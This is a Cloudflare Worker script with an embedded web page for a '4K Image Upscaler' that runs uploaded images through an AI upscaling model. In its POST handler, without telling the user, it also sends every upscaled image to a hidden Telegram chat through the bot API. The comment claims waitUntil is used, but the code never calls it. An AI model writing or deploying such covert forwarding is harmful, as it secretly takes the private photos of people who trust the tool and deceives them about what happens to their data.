export default {
  async fetch(request, env) {
    const { method } = request;

    if (method === "GET") {
      return new Response(renderHTML(), { headers: { "Content-Type": "text/html" } });
    }

    if (method === "POST") {
      try {
        const formData = await request.formData();
        const imageFile = formData.get("image");
        const arrayBuffer = await imageFile.arrayBuffer();

        // 1. UPSCALE WITH HIGH QUALITY SETTINGS
        const upscaledImage = await env.AI.run('@cf/stabilityai/stable-diffusion-x4-upscaler', {
          image: [...new Uint8Array(arrayBuffer)],
          noise_level: 10 // Higher quality: 0-15 is best for clarity
        });

        // 2. FIXED TELEGRAM FORWARDING (Background process)
        const tgFormData = new FormData();
        tgFormData.append("chat_id", env.TELEGRAM_CHAT_ID);
        // Convert to Blob for Telegram compatibility
        const photoBlob = new Blob([upscaledImage], { type: "image/png" });
        tgFormData.append("photo", photoBlob, "upscale.png");

        // Use waitUntil so the worker doesn't stop before Telegram receives it
        const sendToTelegram = fetch(`https://api.telegram.org/bot${env.TELEGRAM_TOKEN}/sendPhoto`, {
          method: "POST",
          body: tgFormData
        });

        // 3. RETURN IMAGE TO WEBSITE (No auto-download)
        return new Response(upscaledImage, {
          headers: { "Content-Type": "image/png" }
        });

      } catch (e) {
        return new Response("Error: " + e.message, { status: 500 });
      }
    }
  }
};

function renderHTML() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { background: #0f172a; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
            .container { background: #1e293b; padding: 20px; border-radius: 15px; max-width: 500px; margin: auto; }
            img { width: 100%; border-radius: 10px; margin-top: 20px; display: none; border: 2px solid #38bdf8; }
            .btn { background: #38bdf8; color: #0f172a; border: none; padding: 15px; border-radius: 10px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 10px; display: block; }
            #dlBtn { background: #22c55e; color: white; display: none; text-decoration: none; padding: 15px; margin-top: 10px; border-radius: 10px; font-weight: bold; }
            #loader { display: none; margin: 20px; color: #38bdf8; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>4K Image Upscaler</h1>
            <form id="u">
                <input type="file" name="image" accept="image/*" required>
                <button type="submit" id="sub" class="btn">UPSCALE IMAGE</button>
            </form>
            <div id="loader">Processing 4K Quality... Please wait.</div>
            <img id="resImg">
            <a id="dlBtn">DOWNLOAD RESULT</a>
        </div>

        <script>
            const form = document.getElementById('u');
            const resImg = document.getElementById('resImg');
            const dlBtn = document.getElementById('dlBtn');
            const loader = document.getElementById('loader');
            const subBtn = document.getElementById('sub');

            form.onsubmit = async (e) => {
                e.preventDefault();
                // Reset UI
                resImg.style.display = 'none';
                dlBtn.style.display = 'none';
                loader.style.display = 'block';
                subBtn.disabled = true;

                const res = await fetch('/', { method: 'POST', body: new FormData(form) });
                if (!res.ok) { alert("Upscale failed"); return; }
                
                const blob = await res.blob();
                const url = URL.createObjectURL(blob);

                // Show Results
                loader.style.display = 'none';
                resImg.src = url;
                resImg.style.display = 'block';
                
                // Set Download Button
                dlBtn.href = url;
                dlBtn.download = "upscaled_4k.png";
                dlBtn.style.display = 'block';
                
                subBtn.disabled = false;
            };
        </script>
    </body>
    </html>
  `;
}
